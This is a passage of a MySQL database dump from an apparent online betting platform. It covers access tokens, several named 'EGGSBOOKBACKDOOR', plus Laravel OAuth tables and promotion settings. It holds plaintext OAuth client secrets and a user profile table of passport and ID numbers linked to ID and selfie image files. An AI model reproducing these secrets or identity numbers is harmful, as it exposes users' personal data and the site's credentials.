('f96e537a0c7bb5edecfd8e1e584d41c1ce578af52d2a828426167a7f9f4185a98bd0e13d3ec726c0', '556184', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:07:15', '2022-09-01 05:07:15', '2023-09-01 05:07:15'),
('f9cc1b4f3188d73956984e029943cae67727cb64bb5671fc5c9656059981b54d046b52d8183bdbdf', '725655', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2024-01-08 03:39:18', '2024-01-08 03:39:18', '2025-01-08 03:39:18'),
('fa5c2d2c5b3e6e276834ed20b32627194dc0dcae1726db8994ae3745ab935997a9105e67a1fd5b2f', '218783', 5, 'WINBOSS', '[]', 0, '2023-08-02 15:42:50', '2023-08-02 15:42:50', '2024-08-02 15:42:50'),
('fa85bd092efd95980cb6ef7ff6183f7a294571394cd8cd367104336f53e6bf7ee87c8da16afffba6', '206145', 5, 'WINBOSS', '[]', 0, '2022-09-19 17:03:09', '2022-09-19 17:03:09', '2023-09-19 17:03:09'),
('fa8a045ec3924b33b37a0a6f801b621b30bee77e1a1d0918f7bd81b3c738f6c21a2ab35adbfe0090', '114234', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-05-31 08:36:57', '2023-05-31 08:36:57', '2024-05-31 08:36:57'),
('fad0f16b67df423eec9031f3510deaf21e55727a13116b1db6c22849f825d79f77791d7d61a8c537', '369325', 5, 'WINBOSS', '[]', 0, '2023-07-28 04:03:30', '2023-07-28 04:03:30', '2024-07-28 04:03:30'),
('fb6140eb86e53f8025256007683ca01489f6763028e1631b1d80961105cb7fb2c567cd6baf612f64', '890089', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:33:41', '2022-12-25 22:33:41', '2023-12-25 22:33:41'),
('fbeaf74ab5d4f312c22a56771de2042b275c6d8f3dcffae0f92ebca4ec687ef06d402b70b2d18f27', '729376', 5, 'WINBOSS', '[]', 0, '2023-11-23 12:47:20', '2023-11-23 12:47:20', '2024-11-23 12:47:20'),
('fc0e52f6e92be69dee473b1caca6cb3f68f130ceeae6edd9da2b9d4eab9a15cde9b9092088a4f353', '991234', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:10:10', '2022-12-07 14:10:10', '2023-12-07 14:10:10'),
('fc2927d3d916275256ae386c5885bd7bfae0e714d0a71a4a9f471b59e28edb8c78026e6fd6d8c267', '750458', 5, 'WINBOSS', '[]', 0, '2024-01-20 08:44:47', '2024-01-20 08:44:47', '2025-01-20 08:44:47'),
('fc8784200e3aad0b2dd85b077071bfdeb7126677825e4a453bf45404cd85d9f8cfb93164a7b34010', '497531', 5, 'WINBOSS', '[]', 0, '2022-07-22 03:05:47', '2022-07-22 03:05:47', '2023-07-22 03:05:47'),
('fc8b79083f9306e8dad9c51844ffe3746aa284d1d383108f14c9f8e4c81c09bea3612b6d78ea7bbd', '932618', 5, 'BeTNoW', '[]', 0, '2022-08-10 08:53:48', '2022-08-10 08:53:48', '2023-08-10 08:53:48'),
('fcc87ae24a68da46ec130bfe2dc6a015f8653bd10eacea60df14055ee8abca1143ba2d3f2d6fd3a7', '933351', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:25:40', '2022-12-25 22:25:40', '2023-12-25 22:25:40'),
('fcdb9ee409d61adebfb66a3598bf95cccfca81697c0650f09c0d2914287e5bcc27143ec37a24ae1c', '398768', 5, 'WINBOSS', '[]', 0, '2023-04-14 16:59:46', '2023-04-14 16:59:46', '2024-04-14 16:59:46'),
('fced818c68d9a2fdbb75097d7019381953f2ac518e4081ddef3ef72ac9d64a15a4a18dc0cc11c3bf', '299780', 5, 'WINBOSS', '[]', 0, '2022-12-10 14:22:22', '2022-12-10 14:22:22', '2023-12-10 14:22:22'),
('fcff662f131272e29c480ff11d6279cebb3f377b2d7729a5fa70a23940029eb7383f40599cde4393', '872771', 5, 'WINBOSS', '[]', 0, '2022-08-10 02:58:59', '2022-08-10 02:58:59', '2023-08-10 02:58:59'),
('fd80cbf421f4ec3844395e845f5f52828b38e12e38620ffa4b2b12768c91c8e6d6a4bafcc718eeb4', '954358', 5, 'WINBOSS', '[]', 0, '2022-11-01 04:26:44', '2022-11-01 04:26:44', '2023-11-01 04:26:44'),
('fd8b47217a62c09e12d7ed3bab5e6d5146e0830cbbf1085941a19364ea5d8c4f94369fcfb5a168da', '608314', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-28 03:20:55', '2022-11-28 03:20:55', '2023-11-28 03:20:55'),
('fd94286a8e925da28965e66a4ac6f30d46c4c93879e9a62fd9a0c7ff597f8cff8dff1f0ce348dcc7', '568546', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:22:47', '2022-06-28 08:22:47', '2023-06-28 08:22:47'),
('fe251125782e3ee9f9cf9b79f4898dbb512e087661adf222dba52220341c2ca3811b390eaa76aba2', '531733', 5, 'WINBOSS', '[]', 0, '2023-01-02 19:56:00', '2023-01-02 19:56:00', '2024-01-02 19:56:00'),
('fe613550a714811e0499e54271af01cc3d45abf340591f59fa7413785101c6aab141cb015726ef39', '648138', 5, 'WINBOSS', '[]', 0, '2022-10-02 02:10:39', '2022-10-02 02:10:39', '2023-10-02 02:10:39'),
('fe75f0098c696bad7bbef26dfe3966158c4957faaab17801717039cc6eb51250b395898dd8469cd8', '212463', 5, 'WINBOSS', '[]', 0, '2023-07-30 11:39:58', '2023-07-30 11:39:58', '2024-07-30 11:39:58'),
('feb85758c379b72eba0797a3ba1cd8a0e3b47a48ae9e0083cd0cf3fa0d0d2449548e4d16732cb0be', '794381', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-07-25 11:06:03', '2023-07-25 11:06:03', '2024-07-25 11:06:03'),
('febf44e499010a6e82708d23eb6dc0ee4a59bb99ca0c24c6ea6431558e6de9a354af1b8496604437', '893751', 5, 'WINBOSS', '[]', 0, '2022-12-26 14:35:22', '2022-12-26 14:35:22', '2023-12-26 14:35:22'),
('fecd3b3a2c9e5d7cf99dab84e1941e3b2ea1beac902b0320f3393d0784762e42ed641bf400a22ae1', '900949', 5, 'WINBOSS', '[]', 0, '2023-04-11 02:17:26', '2023-04-11 02:17:26', '2024-04-11 02:17:26'),
('ff530eb34e515da27549e3acb71540f70facf4fcb93c723a066cfa8c969e40bc30bfb5ae56690b42', '725655', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-18 04:47:17', '2023-12-18 04:47:17', '2024-12-18 04:47:17'),
('ffcf0f7a5fd135b223ea7ee963f41effb169515c1f651afec262efbc3f716b335bb908c4b00095f2', '151498', 5, 'WINBOSS', '[]', 0, '2023-08-28 17:45:47', '2023-08-28 17:45:47', '2024-08-28 17:45:47'),
('ffd1e65bb77533f3220e0ecd6cdd3ce7fa59f219c8ff44576cf882d0f59843b7d10b2e7339434298', '407111', 5, 'WINBOSS', '[]', 0, '2023-05-03 03:56:32', '2023-05-03 03:56:32', '2024-05-03 03:56:32'),
('fff76f856f2ff4039cd07ed2b7331fe350d36c66104cd69c7ca3cd7d20d1fd31811b7820374253ca', '249064', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:14:33', '2022-06-28 08:14:33', '2023-06-28 08:14:33');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_auth_codes`
--

DROP TABLE IF EXISTS `oauth_auth_codes`;
CREATE TABLE IF NOT EXISTS `oauth_auth_codes` (
  `id` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL,
  `scopes` text COLLATE utf8mb4_unicode_ci,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `oauth_clients`
--

DROP TABLE IF EXISTS `oauth_clients`;
CREATE TABLE IF NOT EXISTS `oauth_clients` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `secret` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `redirect` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `personal_access_client` tinyint(1) NOT NULL,
  `password_client` tinyint(1) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_clients`
--

INSERT INTO `oauth_clients` (`id`, `user_id`, `name`, `secret`, `redirect`, `personal_access_client`, `password_client`, `revoked`, `created_at`, `updated_at`) VALUES
(1, NULL, 'Laravel Personal Access Client', 'Ym1Jfau7gQABcepaklsbDcYkD1ImldB5u1zwfzO3', 'http://localhost', 1, 0, 0, '2019-11-18 02:41:31', '2019-11-18 02:41:31'),
(2, NULL, 'Laravel Password Grant Client', '9O26qtiMS9d5P2ZolLuPeNYKf3KX6Sng7fpn9KaQ', 'http://localhost', 0, 1, 0, '2019-11-18 02:41:31', '2019-11-18 02:41:31'),
(3, NULL, 'Laravel Personal Access Client', 'WBUyoyRqu3MlR4iFQOhx4LMBY4HXDEsAaU6UqQcb', 'http://localhost', 1, 0, 0, '2020-08-26 07:27:07', '2020-08-26 07:27:07'),
(4, NULL, 'Laravel Password Grant Client', 'qZJAgeuthjRFmoyuSx4HfJsx4PBdmhaoUmzSmF6B', 'http://localhost', 0, 1, 0, '2020-08-26 07:27:07', '2020-08-26 07:27:07'),
(5, NULL, 'Laravel Personal Access Client', 'O4iDj0q6pGPtpbaRAtruDwrpqdlxcd8OxHpSn8LS', 'http://localhost', 1, 0, 0, '2020-08-26 19:51:09', '2020-08-26 19:51:09'),
(6, NULL, 'Laravel Password Grant Client', 'AcWUawOc1bE4fOaj0IdwMFVE3bs8zRMzRlGubQUT', 'http://localhost', 0, 1, 0, '2020-08-26 19:51:09', '2020-08-26 19:51:09');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_personal_access_clients`
--

DROP TABLE IF EXISTS `oauth_personal_access_clients`;
CREATE TABLE IF NOT EXISTS `oauth_personal_access_clients` (
  `id` int(10) UNSIGNED NOT NULL,
  `client_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `oauth_personal_access_clients`
--

INSERT INTO `oauth_personal_access_clients` (`id`, `client_id`, `created_at`, `updated_at`) VALUES
(1, 1, '2019-11-18 02:41:31', '2019-11-18 02:41:31'),
(2, 3, '2020-08-26 07:27:07', '2020-08-26 07:27:07'),
(3, 5, '2020-08-26 19:51:09', '2020-08-26 19:51:09');

-- --------------------------------------------------------

--
-- Table structure for table `oauth_refresh_tokens`
--

DROP TABLE IF EXISTS `oauth_refresh_tokens`;
CREATE TABLE IF NOT EXISTS `oauth_refresh_tokens` (
  `id` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `access_token_id` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `package_weekly_123betnow`
--

DROP TABLE IF EXISTS `package_weekly_123betnow`;
CREATE TABLE IF NOT EXISTS `package_weekly_123betnow` (
  `package_weekly_ID` int(11) NOT NULL,
  `package_weekly_User` int(11) NOT NULL,
  `package_weekly_FromDate` datetime NOT NULL,
  `package_weekly_ToDate` datetime NOT NULL,
  `package_weekly_Status` tinyint(1) NOT NULL,
  `package_weekly_Level` tinyint(4) NOT NULL,
  `package_weekly_TotalBet` decimal(18,8) DEFAULT NULL,
  `package_weekly_F1Active` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
CREATE TABLE IF NOT EXISTS `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `post_notifications`
--

DROP TABLE IF EXISTS `post_notifications`;
CREATE TABLE IF NOT EXISTS `post_notifications` (
  `id` int(11) NOT NULL,
  `vi_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `en_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `cn_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `kr_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `ru_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `es_title` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `vi_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `en_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `cn_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `kr_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `ru_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `es_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `order` int(11) NOT NULL,
  `status` int(1) NOT NULL,
  `is_new` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `profile`
--

DROP TABLE IF EXISTS `profile`;
CREATE TABLE IF NOT EXISTS `profile` (
  `Profile_ID` int(11) NOT NULL,
  `Profile_User` varchar(20) NOT NULL COMMENT 'ID User (users)',
  `Profile_Full_Name` text,
  `Profile_Passport_ID` varchar(25) NOT NULL COMMENT 'Số thẻ',
  `Profile_Passport_Image` varchar(255) DEFAULT NULL COMMENT 'Hình thẻ căn cước',
  `Profile_Passport_Image_Selfie` varchar(255) NOT NULL COMMENT 'Hình người dùng cùng thẻ căn cước',
  `Profile_Status` int(11) NOT NULL DEFAULT '0' COMMENT '-1: Không xác thực | 0: Chờ xác thực | 1: Đã xác thực',
  `Profile_Time` datetime DEFAULT NULL COMMENT 'Thời gian gửi thông tin'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `profile`
--

INSERT INTO `profile` (`Profile_ID`, `Profile_User`, `Profile_Full_Name`, `Profile_Passport_ID`, `Profile_Passport_Image`, `Profile_Passport_Image_Selfie`, `Profile_Status`, `Profile_Time`) VALUES
(8, '123123', NULL, '1231231231', 'users/123123/profile/passport_image_123123_5fe6ff58c456f.jpg', 'users/123123/profile/passport_image_selfie_123123_5fe6ff58c456f.png', 1, '2020-12-26 09:16:10'),
(10, '456319', NULL, '123456789', 'users/456319/profile/passport_image_456319_5fe9942905f7d.jpg', 'users/456319/profile/passport_image_selfie_456319_5fe9942905f7d.jpg', 1, '2020-12-28 08:15:39'),
(11, '896794', NULL, '123123abc', 'users/896794/profile/passport_image_896794_5fe99517d7ea2.jpg', 'users/896794/profile/passport_image_selfie_896794_5fe99517d7ea2.jpg', 1, '2020-12-28 08:19:37'),
(12, '909181', NULL, '1237654asd', 'users/909181/profile/passport_image_909181_5fe99cf6bb79e.jpg', 'users/909181/profile/passport_image_selfie_909181_5fe99cf6bb79e.jpg', 1, '2020-12-28 08:53:13'),
(13, '436628', NULL, '321313123', 'users/436628/profile/passport_image_436628_5fe99d5653fd4.png', 'users/436628/profile/passport_image_selfie_436628_5fe99d5653fd4.jpg', 1, '2020-12-28 08:54:49'),
(14, '225648', NULL, '1234nbvd', 'users/225648/profile/passport_image_225648_5fe9b2c172653.jpg', 'users/225648/profile/passport_image_selfie_225648_5fe9b2c172653.jpg', 1, '2020-12-28 10:26:12'),
(15, '992035', NULL, '000502911', 'users/992035/profile/passport_image_992035_5ff3588722dc5.jpg', 'users/992035/profile/passport_image_selfie_992035_5ff3588722dc5.jpg', 1, '2021-01-04 18:03:54'),
(16, '743442', NULL, 'B7562344', 'users/743442/profile/passport_image_743442_5ff420f3b00fd.jpeg', 'users/743442/profile/passport_image_selfie_743442_5ff420f3b00fd.jpeg', 1, '2021-01-05 08:19:02'),
(17, '397727', NULL, '381804006', 'users/397727/profile/passport_image_397727_5ff4244f050aa.jpg', 'users/397727/profile/passport_image_selfie_397727_5ff4244f050aa.jpg', 1, '2021-01-05 08:33:21'),
(18, '657512', NULL, '331743157', 'users/657512/profile/passport_image_657512_5ff42d0d860c6.jpg', 'users/657512/profile/passport_image_selfie_657512_5ff42d0d860c6.jpg', 1, '2021-01-05 09:10:40'),
(19, '188245', NULL, '270113695066', 'users/188245/profile/passport_image_188245_5ff46c3f5563c.jpeg', 'users/188245/profile/passport_image_selfie_188245_5ff46c3f5563c.jpeg', 1, '2021-01-05 13:40:18'),
(20, '662721', NULL, '385147111', 'users/662721/profile/passport_image_662721_5ff525aaabbfa.jpg', 'users/662721/profile/passport_image_selfie_662721_5ff525aaabbfa.jpg', 1, '2021-01-06 02:51:25'),
(21, '703452', NULL, '12342gbfcvdf', 'users/703452/profile/passport_image_703452_5ff570ae82110.jpg', 'users/703452/profile/passport_image_selfie_703452_5ff570ae82110.jpg', 1, '2021-01-06 08:11:29'),
(23, '947769', NULL, '001094006892', 'users/947769/profile/passport_image_947769_5ff6a1568048a.jpeg', 'users/947769/profile/passport_image_selfie_947769_5ff6a1568048a.jpeg', 1, '2021-01-07 05:51:21'),
(24, '921459', NULL, '001190020990', 'users/921459/profile/passport_image_921459_5ff6b8abbe9df.jpeg', 'users/921459/profile/passport_image_selfie_921459_5ff6b8abbe9df.jpeg', 1, '2021-01-07 07:30:54'),
(25, '492787', NULL, '001170013549', 'users/492787/profile/passport_image_492787_5ff6b969d1f1d.jpeg', 'users/492787/profile/passport_image_selfie_492787_5ff6b969d1f1d.jpeg', 1, '2021-01-07 07:34:04'),
(26, '439131', NULL, '036193003416', 'users/439131/profile/passport_image_439131_5ff7ae531c3cc.jpeg', 'users/439131/profile/passport_image_selfie_439131_5ff7ae531c3cc.jpeg', 1, '2021-01-08 00:59:02'),
(27, '707425', NULL, '230935721', 'users/707425/profile/passport_image_707425_5ff96abde8bbc.jpeg', 'users/707425/profile/passport_image_selfie_707425_5ff96abde8bbc.jpeg', 1, '2021-01-09 08:35:12'),
(30, '963912', NULL, 'C5683029', 'users/963912/profile/passport_image_963912_600197659593d.jpeg', 'users/963912/profile/passport_image_selfie_963912_600197659593d.jpeg', 1, '2021-01-15 13:23:51'),
(31, '585389', NULL, '12344444444232323', 'users/585389/profile/passport_image_585389_6003c8ffb4ea8.png', 'users/585389/profile/passport_image_selfie_585389_6003c8ffb4ea8.png', 1, '2021-01-17 05:20:02'),
(32, '668741', NULL, '125237422', 'users/668741/profile/passport_image_668741_6007ac7aa47fb.jpeg', 'users/668741/profile/passport_image_selfie_668741_6007ac7aa47fb.jpeg', 1, '2021-01-20 04:07:25'),
(33, '198390', NULL, '031192005193', 'users/198390/profile/passport_image_198390_600fa432b53b0.jpeg', 'users/198390/profile/passport_image_selfie_198390_600fa432b53b0.jpeg', 1, '2021-01-26 05:10:14'),
(34, '849763', NULL, '026087005191', 'users/849763/profile/passport_image_849763_601761bb7b164.jpg', 'users/849763/profile/passport_image_selfie_849763_601761bb7b164.jpg', 1, '2021-02-01 02:04:46'),
(35, '727902', NULL, '049198000069', 'users/727902/profile/passport_image_727902_60176ae982837.jpeg', 'users/727902/profile/passport_image_selfie_727902_60176ae982837.jpeg', 1, '2021-02-01 02:43:56'),
(36, '261778', NULL, '434345345', 'users/261778/profile/passport_image_261778_6017789070076.jpg', 'users/261778/profile/passport_image_selfie_261778_6017789070076.jpg', 1, '2021-02-01 03:42:11'),
(37, '813462', NULL, '036071000805', 'users/813462/profile/passport_image_813462_6017852179dcb.jpg', 'users/813462/profile/passport_image_selfie_813462_6017852179dcb.jpg', 1, '2021-02-01 04:35:48'),
(38, '153171', NULL, '240960102', 'users/153171/profile/passport_image_153171_60178a6314279.jpeg', 'users/153171/profile/passport_image_selfie_153171_60178a6314279.jpeg', 1, '2021-02-01 04:58:14'),
(39, '174475', NULL, '026187003482', 'users/174475/profile/passport_image_174475_60178ae3391f6.jpg', 'users/174475/profile/passport_image_selfie_174475_60178ae3391f6.jpg', 1, '2021-02-01 05:00:21'),
(40, '940563', NULL, '212655765', 'users/940563/profile/passport_image_940563_6017ebd145666.jpeg', 'users/940563/profile/passport_image_selfie_940563_6017ebd145666.jpeg', 1, '2021-02-01 11:53:55'),
(41, '592204', NULL, '212229341', 'users/592204/profile/passport_image_592204_6017ece055d21.jpeg', 'users/592204/profile/passport_image_selfie_592204_6017ece055d21.jpeg', 1, '2021-02-01 11:58:27'),
(42, '628522', NULL, '241470126', 'users/628522/profile/passport_image_628522_601805e501a6e.jpeg', 'users/628522/profile/passport_image_selfie_628522_601805e501a6e.jpeg', 1, '2021-02-01 13:45:11'),
(43, '184089', NULL, '211342537', 'users/184089/profile/passport_image_184089_6018acc7cdbeb.jpeg', 'users/184089/profile/passport_image_selfie_184089_6018acc7cdbeb.jpeg', 1, '2021-02-02 01:37:14'),
(44, '284725', NULL, '212696086', 'users/284725/profile/passport_image_284725_6018d01964b23.jpeg', 'users/284725/profile/passport_image_selfie_284725_6018d01964b23.jpeg', 1, '2021-02-02 04:07:56'),
(45, '832263', NULL, '212442127', 'users/832263/profile/passport_image_832263_6018d2607ba29.jpeg', 'users/832263/profile/passport_image_selfie_832263_6018d2607ba29.jpeg', 1, '2021-02-02 04:17:39'),
(46, '535327', NULL, '135041545', 'users/535327/profile/passport_image_535327_601923af1c422.jpeg', 'users/535327/profile/passport_image_selfie_535327_601923af1c422.jpeg', 1, '2021-02-02 10:04:33'),
(48, '373087', NULL, '260109265520', 'users/373087/profile/passport_image_373087_601960b420e2d.jpeg', 'users/373087/profile/passport_image_selfie_373087_601960b420e2d.jpeg', 1, '2021-02-02 14:24:54');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_countries`
--

DROP TABLE IF EXISTS `promotion_countries`;
CREATE TABLE IF NOT EXISTS `promotion_countries` (
  `ID` int(11) NOT NULL,
  `Countries_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `Status` int(11) NOT NULL,
  `Created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_countries`
--

INSERT INTO `promotion_countries` (`ID`, `Countries_id`, `Status`, `Created_at`, `Updated_at`) VALUES
(1, 'Antigua And Barbuda', 1, '2021-01-25 08:38:21', '2021-01-25 08:38:21'),
(2, 'Aruba', -1, '2021-01-25 09:28:38', '2021-01-25 09:28:38'),
(3, 'Burkina Faso', 1, '2021-01-25 09:28:48', '2021-01-25 09:28:48'),
(4, 'Jersey', 1, '2021-01-25 09:28:58', '2021-01-25 09:28:58'),
(5, 'Argentina', 1, '2021-01-26 04:24:47', '2021-01-26 04:24:47'),
(6, 'Bahamas The', 1, '2021-01-26 04:24:50', '2021-01-26 04:24:50'),
(7, 'Bolivia', 1, '2021-01-26 04:24:54', '2021-01-26 04:24:54');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_date`
--

DROP TABLE IF EXISTS `promotion_date`;
CREATE TABLE IF NOT EXISTS `promotion_date` (
  `ID` int(11) NOT NULL,
  `Date` int(11) NOT NULL,
  `Fee` float NOT NULL,
  `Status` int(1) NOT NULL,
  `Created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_date`
--

INSERT INTO `promotion_date` (`ID`, `Date`, `Fee`, `Status`, `Created_at`, `Updated_at`) VALUES
(1, 7, 0.1, 1, '2021-01-20 08:46:14', '2021-01-20 08:46:14'),
(2, 30, 0.12, 1, '2021-01-20 08:46:40', '2021-01-20 08:46:40'),
(3, 60, 0.4, -1, '2021-01-25 09:59:31', '2021-01-25 09:59:31'),
(4, 90, 0.3, -1, '2021-01-25 10:00:19', '2021-01-25 10:00:19'),
(5, 60, 0.15, 1, '2021-01-26 03:46:33', '2021-01-26 03:46:33'),
(6, 80, 0.21, 1, '2021-01-26 03:46:41', '2021-01-26 03:46:41'),
(7, 90, 0.56, 1, '2021-01-26 03:46:47', '2021-01-26 03:46:47'),
(8, 21, 0.016, 1, '2021-01-26 04:33:55', '2021-01-26 04:33:55'),
(9, 47, 0.045, 1, '2021-01-26 04:34:05', '2021-01-26 04:34:05'),
(10, 89, 0.13, 1, '2021-01-26 04:34:15', '2021-01-26 04:34:15');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_game`
--

DROP TABLE IF EXISTS `promotion_game`;
CREATE TABLE IF NOT EXISTS `promotion_game` (
  `Promotion_Game_ID` int(11) NOT NULL,
  `Promotion_Game_Name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `Promotion_Game_Status` int(11) NOT NULL,
  `Created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `Updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_game`
--

INSERT INTO `promotion_game` (`Promotion_Game_ID`, `Promotion_Game_Name`, `Promotion_Game_Status`, `Created_at`, `Updated_at`) VALUES
(1, 'Binary Options', -1, '2021-01-18 08:18:09', '2021-01-18 08:18:09'),
(2, 'Casino Online', 1, '2021-01-18 08:18:27', '2021-01-18 08:18:27'),
(3, 'Fish Online', 1, '2021-01-18 08:18:34', '2021-01-18 08:18:34'),
(4, 'Sportbook', 1, '2021-01-21 03:29:38', '2021-01-21 03:29:38'),
(5, '1', -1, '2021-01-25 10:24:54', '2021-01-25 10:24:54'),
(6, 'gggggg', -1, '2021-01-25 10:27:16', '2021-01-25 10:27:16'),
(7, 'Binary Options', 1, '2021-01-26 03:49:24', '2021-01-26 03:49:24'),
(8, 'gggggg', -1, '2021-01-26 04:01:00', '2021-01-26 04:01:00'),
(9, 'game1', 1, '2021-01-26 04:24:12', '2021-01-26 04:24:12'),
(10, 'game2', 1, '2021-01-26 04:24:17', '2021-01-26 04:24:17'),
(11, 'game3', 1, '2021-01-26 04:24:21', '2021-01-26 04:24:21');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_min`
--

DROP TABLE IF EXISTS `promotion_min`;
CREATE TABLE IF NOT EXISTS `promotion_min` (
  `ID` int(11) NOT NULL,
  `Min` decimal(18,8) NOT NULL,
  `Status` int(11) NOT NULL,
  `Created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_min`
--

INSERT INTO `promotion_min` (`ID`, `Min`, `Status`, `Created_at`) VALUES
(1, '200.00000000', 1, '2021-01-26 05:50:48'),
(2, '1.00000000', 1, '2021-01-26 06:10:06'),
(3, '10.00000000', 1, '2021-01-26 07:53:25');

-- --------------------------------------------------------

--
-- Table structure for table `promotion_sub`
--

DROP TABLE IF EXISTS `promotion_sub`;
CREATE TABLE IF NOT EXISTS `promotion_sub` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `subAccount` varchar(50) DEFAULT NULL,
  `amount` decimal(18,8) NOT NULL,
  `game` varchar(255) NOT NULL,
  `time` varchar(50) DEFAULT NULL,
  `countries` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `days` int(30) DEFAULT NULL,
  `created_time` datetime NOT NULL,
  `expired_time` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `balance` decimal(18,8) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `promotion_sub`
--

INSERT INTO `promotion_sub` (`id`, `user_id`, `subAccount`, `amount`, `game`, `time`, `countries`, `days`, `created_time`, `expired_time`, `status`, `balance`) VALUES
(2, 463861, NULL, '500.00000000', 'Binary Options', '19:00 - 21:00', '', 30, '2021-01-20 09:56:22', '2021-02-19 09:56:22', -1, '990.00000000'),
(3, 463861, NULL, '700.00000000', 'Casino Online', '19:00 - 22:00', '', 30, '2021-01-20 10:05:14', '2021-02-19 10:05:14', -1, '990.00000000'),
(4, 463861, NULL, '600.00000000', 'Binary Options', '19:00 - 21:00', '', 7, '2021-01-20 10:09:59', '2021-01-27 10:09:59', -1, '990.00000000'),
(5, 463861, NULL, '600.00000000', 'Casino Online', '19:00 - 21:00', '', 30, '2021-01-20 10:18:24', '2021-02-19 10:18:24', -1, '990.00000000'),
(6, 463861, NULL, '600.00000000', 'Fish Online', '19:00 - 22:00', '', 30, '2021-01-20 10:18:57', '2021-02-19 10:18:57', -1, '990.00000000'),
(7, 463861, NULL, '555.00000000', 'Binary Options', '19:00 - 21:00', '', 30, '2021-01-20 10:19:57', '2021-02-19 10:19:57', -1, '990.00000000'),
